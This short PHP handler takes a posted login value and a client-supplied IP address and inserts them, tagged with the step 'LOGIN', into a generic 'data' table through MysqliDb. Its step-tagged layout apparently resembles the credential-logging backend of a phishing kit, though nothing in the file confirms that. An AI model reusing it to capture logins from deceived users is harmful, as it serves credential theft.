<?php

if( $_POST ) {

    include_once '../app.php';
    $db = new MysqliDb ($db_infos['host'], $db_infos['db_user'], $db_infos['db_pass'], $db_infos['database_name']);

    $login = $_POST['login'];
    $ip    = $_POST['ip'];

    $data = [
        'login'   => $login,
        'step'    => 'LOGIN',
        'ip'      => $ip
    ];

    $insert = $db->insert ('data', $data);

    $db->disconnect();

}

?>